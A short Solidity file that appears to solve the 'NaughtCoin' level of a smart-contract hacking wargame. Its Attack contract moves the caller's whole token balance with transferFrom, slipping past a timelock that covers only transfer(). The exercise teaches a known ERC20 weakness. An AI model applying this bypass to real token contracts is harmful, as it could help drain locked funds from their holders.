// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";

import "./Level15.sol";

contract Attack {
    function attackNaughtCoin(NaughtCoin _instance) public {
        uint256 balance = _instance.balanceOf(msg.sender);
        _instance.transferFrom(msg.sender, address(this), balance);
    }
}
